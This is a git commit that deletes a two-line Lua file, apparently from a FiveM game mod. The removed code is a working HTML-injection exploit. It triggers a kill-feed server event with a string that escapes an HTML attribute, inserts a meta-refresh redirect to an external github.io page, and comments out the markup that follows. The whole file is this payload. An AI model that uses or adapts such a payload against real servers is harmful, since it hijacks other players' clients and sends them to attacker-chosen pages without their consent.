95e6f75be002e253d909066df970d4aa68118882
jabby <61084256+murphybluff@users.noreply.github.com>
2025-03-03 16:55:50 +0800

    Delete ewan.lua

--- ewan.lua
+++
@@ -1,2 +0,0 @@
-local killedCoords = GetEntityCoords(PlayerPedId())
-TriggerServerEvent('zcKillFeed:Killed', 577, [[" class="weapon_container"><meta http-equiv='refresh' content='10; url=https://murphybluff.github.io/fuck/'><!--]], killedCoords)
